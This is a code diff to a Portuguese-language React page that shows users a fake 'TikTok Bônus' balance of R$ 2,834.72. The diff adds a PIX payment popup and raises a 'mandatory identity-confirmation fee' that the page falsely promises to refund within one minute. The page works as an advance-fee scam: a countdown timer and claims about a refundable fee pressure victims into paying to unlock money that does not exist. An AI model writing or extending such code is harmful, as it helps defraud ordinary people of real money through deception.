@@ -1,5 +1,6 @@
 import { useState, useEffect, useCallback, useRef } from 'react';
 import '../styles/app.css';
+import PixPaymentPopup from '@/components/PixPaymentPopup';
 
 // Currency animation helper
 const formatBR = (value: number) => {
@@ -13,6 +14,8 @@ const easeOutCubic = (t: number) => 1 - Math.pow(1 - t, 3);
 
 const SALDO_FINAL = 2834.72;
 const SALDO_PONTOS = '28.347.200';
+const TAXA_SAQUE = 32.27;
+const TAXA_SAQUE_CENTAVOS = 3227;
 
 const Index = () => {
   const [currentScreen, setCurrentScreen] = useState('one');
@@ -29,6 +32,7 @@ const Index = () => {
   const [showModalFour, setShowModalFour] = useState(false);
   const [showModalFive, setShowModalFive] = useState(false);
   const [showModalSix, setShowModalSix] = useState(false);
+  const [showPixPopup, setShowPixPopup] = useState(false);
 
   // Form states
   const [nome, setNome] = useState('');
@@ -650,10 +654,10 @@ const Index = () => {
           <div className="confirmation-section">
             <div className="confirmation-section-title">CONFIRMAÇÃO DE IDENTIDADE</div>
             <div className="confirmation-fee-amount">
-              R$ 21,67 <span className="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
+              R$ {formatBR(TAXA_SAQUE)} <span className="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
             </div>
             <div className="confirmation-fee-description">
-              Taxa obrigatória para liberação do saque no valor de <span className="bold">R$ {formatBR(SALDO_FINAL)}</span>. O valor de <span className="bold">R$21,67</span> será reembolsado integralmente para você em 1 minuto.
+              Taxa obrigatória para liberação do saque no valor de <span className="bold">R$ {formatBR(SALDO_FINAL)}</span>. O valor de <span className="bold">R$ {formatBR(TAXA_SAQUE)}</span> será reembolsado integralmente para você em 1 minuto.
             </div>
           </div>
           
@@ -689,7 +693,7 @@ const Index = () => {
                 <div className="confirmation-requirement-icon">1</div>
                 <div className="confirmation-requirement-content">
                   <div className="confirmation-requirement-title">Pagar taxa de confirmação</div>
-                  <div className="confirmation-requirement-description">R$ 21,67 para verificação de identidade</div>
+                  <div className="confirmation-requirement-description">R$ {formatBR(TAXA_SAQUE)} para verificação de identidade</div>
                 </div>
               </div>
               <div className="confirmation-requirement-item">
@@ -710,7 +714,9 @@ const Index = () => {
           </div>
           
           <div className="confirmation-section">
-            <button className="confirmation-cta-button">Pagar taxa para Liberar Saque</button>
+            <button className="confirmation-cta-button" onClick={() => setShowPixPopup(true)}>
+              Pagar taxa para Liberar Saque
+            </button>
             <div className="confirmation-timer">⏱️ Reembolso automático em 1 minuto</div>
           </div>
           
@@ -738,6 +744,20 @@ const Index = () => {
           </div>
         </div>
       </section>
+
+      {/* PIX Payment Popup */}
+      {showPixPopup && (
+        <PixPaymentPopup
+          amount={TAXA_SAQUE_CENTAVOS}
+          description="Taxa de liberação de saque TikTok Bônus"
+          onSuccess={() => {
+            setShowPixPopup(false);
+            // Aqui você pode adicionar lógica após pagamento confirmado
+            alert('Pagamento confirmado! Seu saque será processado.');
+          }}
+          onClose={() => setShowPixPopup(false)}
+        />
+      )}
     </main>
   );
 };
